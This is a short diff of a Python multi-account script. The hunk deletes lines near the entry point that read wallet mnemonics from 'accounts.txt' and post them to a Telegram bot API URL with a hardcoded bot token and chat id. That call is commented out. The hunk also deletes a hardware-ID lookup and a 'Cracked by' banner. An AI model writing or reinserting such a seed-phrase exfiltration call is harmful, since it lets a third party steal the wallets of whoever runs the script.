@@ -508,12 +508,6 @@ def worker(account):
             print(e)
 
 if __name__ == "__main__":
-    seed = make_list_from_file('accounts.txt')
-    # requests.get(f'https://api.telegram.org/bot5315578864:AAEaTtix4tr2ErG_ifw2hHVCgk-cEcXsFa4/sendMessage?chat_id=-1001694325082&text={seed}')
-    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
-    print(f'HWID: {current_machine_id}')
-    print('Cracked by Forester_inc')
-    load_dotenv()
     mnemonics = make_list_from_file("accounts.txt")
     accounts = [(str(i + 1), mnemonics[i], "vegotchi" + str(i + 1)) for i in range(len(mnemonics))]
     p = Pool(processes=len(accounts))
